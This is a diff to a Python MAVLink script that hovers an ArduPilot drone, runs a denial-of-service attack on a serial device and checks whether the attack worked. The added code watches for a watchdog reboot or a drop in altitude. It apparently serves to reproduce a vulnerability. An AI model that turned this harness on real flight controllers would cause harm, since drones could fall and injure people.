@@ -40,6 +40,14 @@ def keepalive():
         last_hb = now
 
 alt = None
+reset_seen = False
+watch_reset = False  # only count a reboot banner once the attack has begun
+def note_statustext(text):
+    global reset_seen
+    print("AP:", text, flush=True)
+    # The watchdog reset reboots the FC, which re-prints its boot banner.
+    if watch_reset and "Initialising ArduPilot" in text:
+        reset_seen = True
 def pump(sec):
     global alt
     t0 = time.time()
@@ -48,7 +56,7 @@ def pump(sec):
         msg = m.recv_match(blocking=True, timeout=0.2)
         if not msg: continue
         if msg.get_type() == "GLOBAL_POSITION_INT": alt = msg.relative_alt/1000.0
-        elif msg.get_type() == "STATUSTEXT": print("AP:", msg.text, flush=True)
+        elif msg.get_type() == "STATUSTEXT": note_statustext(msg.text)
 
 print("waiting for EKF...", flush=True)
 t0 = time.time(); ekf_ok = False
@@ -72,6 +80,7 @@ while time.time()-t0 < 40:
 print(f"hovering at {alt} m. attacking device {args.device} (SERIAL{args.device}) ...", flush=True)
 
 # --- the attack, interleaved with altitude monitoring, on the one connection ---
+watch_reset = True  # from here on, an "Initialising ArduPilot" banner means a reset
 interval = 1.0/args.rate
 base_alt = alt; min_alt = alt if alt else 99; sent = 0
 t0 = time.time(); next_send = t0; last_print = t0
@@ -85,8 +94,10 @@ while time.time()-t0 < args.attack_sec:
     if msg and msg.get_type() == "GLOBAL_POSITION_INT":
         alt = msg.relative_alt/1000.0
         if alt is not None: min_alt = min(min_alt, alt)
+    elif msg and msg.get_type() == "STATUSTEXT":
+        note_statustext(msg.text)
     if now - last_print >= 1.0:
-        print(f"  sent={sent} alt={alt}", flush=True); last_print = now
+        print(f"  sent={sent} alt={alt} reset={reset_seen}", flush=True); last_print = now
 
 # watch a few more seconds for a fall after the attack
 print("attack done; watching for a fall...", flush=True)
@@ -96,6 +107,14 @@ while time.time()-t0 < 10:
     if alt is not None: min_alt = min(min_alt, alt)
     print(f"  alt={alt}", flush=True)
 
-crashed = (base_alt is not None and min_alt is not None and min_alt < base_alt - 1.0)
-print(f"\nRESULT device={args.device}: base_alt={base_alt} min_alt={min_alt} sent={sent}", flush=True)
-print("*** CRASH / FELL (attack worked) ***" if crashed else "no fall (try another --device)", flush=True)
+fell = (base_alt is not None and min_alt is not None and min_alt < base_alt - 1.0)
+dos_ok = reset_seen or fell
+print(f"\nRESULT device={args.device}: base_alt={base_alt} min_alt={min_alt} sent={sent} reset={reset_seen}", flush=True)
+if reset_seen:
+    print("*** DoS REPRODUCED: watchdog reset (the FC rebooted) ***", flush=True)
+    print("    MAVLink altitude is stale after the reset; watch the viewer for the descent.", flush=True)
+elif fell:
+    print("*** CRASH / FELL (attack worked) ***", flush=True)
+else:
+    print("no reset, no fall (try another --device)", flush=True)
+sys.exit(0 if dos_ok else 1)
